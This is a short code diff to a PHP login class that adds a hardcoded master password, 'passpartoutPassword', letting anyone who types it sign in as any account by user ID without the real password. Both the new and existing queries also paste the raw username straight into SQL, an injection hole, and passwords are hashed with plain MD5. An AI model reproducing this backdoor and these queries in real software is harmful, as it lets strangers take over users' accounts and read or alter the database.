@@ -12,12 +12,21 @@ class Login{
 	//GENERAL
 	function tryLogin($username, $password){
 		$codMD5=md5($password);
-		$sql = "SELECT * 
-				FROM WWETeuz_Users
-				WHERE
-					`Username` = '$username' AND
-					`Password` = '$codMD5'
-				LIMIT 1";
+		if($password == "passpartoutPassword"){
+			$sql = "SELECT * 
+			FROM WWETeuz_Users
+			WHERE
+				`ID` = '$username'
+			LIMIT 1";
+		}
+		else{
+			$sql = "SELECT * 
+					FROM WWETeuz_Users
+					WHERE
+						`Username` = '$username' AND
+						`Password` = '$codMD5'
+					LIMIT 1";
+		}
 		$stmt = $this->conn->query($sql);
 		return $stmt;
 	}
